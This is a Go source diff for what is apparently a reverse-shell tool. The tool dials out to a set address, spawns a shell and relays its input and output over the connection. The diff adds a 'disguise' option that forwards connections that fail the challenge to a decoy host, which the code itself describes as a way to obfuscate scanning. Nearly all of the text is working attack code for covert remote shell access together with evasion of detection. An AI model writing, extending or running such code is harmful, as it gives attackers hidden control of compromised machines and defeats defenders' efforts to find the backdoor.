@@ -66,13 +66,23 @@ func main() {
 	command := flag.String("command", "sh", "command to use to start up shell")
 	network := flag.String("network", "tcp", "network protocol to use")
 	address := flag.String("address", "127.0.0.1:9000", "the address to dial up")
+	disguise := flag.String("disguise", "", "the address and port to forward all invalid connections to in order to obfuscate scanning")
 
 	flag.Parse()
 
+	var forward net.Conn
 	connection, err := net.Dial(*network, *address)
 
 	if err != nil {
 		panic(err)
+	}
+
+	if *disguise != "" {
+		forward, err = net.Dial(*network, *disguise)
+
+		if err != nil {
+			panic(err)
+		}
 	}
 
 	defer connection.Close()
@@ -87,9 +97,8 @@ func main() {
 
 	encapsulation_buffer := new(bytes.Buffer)
 	encapsulation_wrapper := comm.NewEncapsulationWrapper(encapsulator, encapsulation_buffer)
-	// handle shell here
 
-	go reverseProof(*command, send, recieve)
+	go reverseProof(*command, send, recieve, forward)
 
 	go func() {
 		for {
@@ -118,7 +127,7 @@ func main() {
 	}
 }
 
-func reverseProof(command string, send chan []byte, recieve chan []byte) {
+func reverseProof(command string, send chan []byte, recieve chan []byte, forward net.Conn) {
 	cmd := exec.Command(command)
 
 	stdin, _ := cmd.StdinPipe()
@@ -142,6 +151,8 @@ func reverseProof(command string, send chan []byte, recieve chan []byte) {
 				if data[0] == 1 {
 					challenger.Update(data[1:])
 					stdin.Write(data[1:])
+				} else if forward != nil {
+					forward.Write(data)
 				}
 			}
 		}
@@ -154,6 +165,16 @@ func reverseProof(command string, send chan []byte, recieve chan []byte) {
 			send <- buffer[:n]
 		}
 	}()
+
+	if forward != nil {
+		go func() {
+			for {
+				buffer := make([]byte, buffer_size)
+				n, _ := forward.Read(buffer)
+				send <- buffer[:n]
+			}
+		}()
+	}
 
 	cmd.Start()
 
